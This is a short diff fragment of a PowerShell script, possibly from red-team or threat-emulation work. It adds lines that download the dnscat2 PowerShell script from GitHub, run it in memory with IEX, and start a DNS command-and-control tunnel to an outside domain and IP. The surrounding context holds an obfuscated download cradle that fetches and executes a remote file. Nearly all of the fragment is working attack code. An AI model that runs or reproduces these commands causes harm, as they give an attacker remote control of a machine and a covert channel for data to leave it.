@@ -1,3 +1,9 @@
+[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
+
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
+
+Start-Dnscat2 -Domain ryu.threatblue.ninja -DNSServer 3.22.89.81
+
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-Expression (New-Object Net.WebClient).("D`o`Wn"+"LoAdStRiNg").Invoke('https://github.com/msffluffybunnies/rabbithole/blob/master/test.txt?raw=true')
 
 Add-Type -AssemblyName System.IdentityModel 
